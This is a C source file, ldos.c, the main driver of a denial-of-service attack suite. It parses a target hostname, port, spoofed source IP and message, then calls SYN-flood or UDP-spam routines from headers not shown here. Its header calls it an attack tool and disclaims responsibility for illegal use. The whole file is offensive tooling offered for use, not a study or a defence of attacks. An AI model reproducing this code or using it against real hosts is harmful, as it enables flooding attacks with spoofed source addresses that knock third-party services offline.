
/* =====================================================================================
 *
 *       Filename:  ldos.c
 *
 *    Description: This file ties together each attack into the suite. This will
 *    call syn_flood or udp_flood.
 *                 
 *                
 *                          ./ldos -a <attack> -p <port> -h <hostname> -s <source_ip> 
 *
 *        Version:  1.0
 *        Created:  06/01/2018 07:36:49 PM
 *       Revision:  1.0
 *       Compiler:  gcc
 *
 *         Author:  Luke Cesarz (lc), htonl (git)
 *        Address:  Minneapolis MN
 *
 * =====================================================================================
 * This software comes with no warrenties. It is free to use and copy. Any use
 * of this software in an illegal way, is not the responsibility of the
 * original author. 
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include "udp_spam.h"
#include "syn_flood.h"
#include "sock_config.h"


int main(int argc, char* argv[])
{
    // parse args
    char hostname[1024];
    char message[1024];
    char source_ip[32];
    int port = 0;
    char attack_type[32];

    //initialize all the arguments
    bzero(hostname, sizeof(hostname));
    bzero(source_ip, sizeof(source_ip));
    bzero(attack_type, sizeof(attack_type));


    if (argc != 9 && argc != 11) {
        printf ("usage: -a attack_type -p port -h hostname -s source_ip -m message (for udp only)\n");
        printf ("Wrong number of args (argc=%d)\n",argc);
        return -1;
    }
    //Arg parsing
    for (int i = 0; i < argc; i++) {
        if (!strcmp(argv[i],"-p")) {
            port = atoi(argv[i + 1]);
        }
        else if (!strcmp(argv[i],"-h")) {
            strncpy(hostname, argv[i + 1], sizeof(hostname));
        }
        else if (!strcmp(argv[i], "-s")) {
            strncpy(source_ip, argv[i + 1], sizeof(source_ip));
        }
        else if (!strcmp(argv[i], "-a")) {
            strncpy(attack_type, argv[i + 1], sizeof(attack_type));
        }
        else if (!strcmp(argv[i], "-m")) {
            strncpy(message, argv[i + 1], sizeof(message));
        }
    }
    if (check_args(hostname, message, port, source_ip, attack_type)) { 
        return -1;
    }
    printf("Starting...\n");
    printf("attack: %s, port: %d, host: %s, source_ip: %s\n",attack_type,port,hostname,source_ip);
    
    // call function (either syn or udp)
    if ( !strncmp(attack_type, "syn_flood", 9)) {
        syn_flood(hostname, port, source_ip);
    }
    else if(!strncmp(attack_type, "udp_spam", 8)) {
        udp_spam(hostname, port, message);
    }
    else {
        printf ("Invalid attack_type argument given. Use syn_flood or udp_spam\n");
    }
}
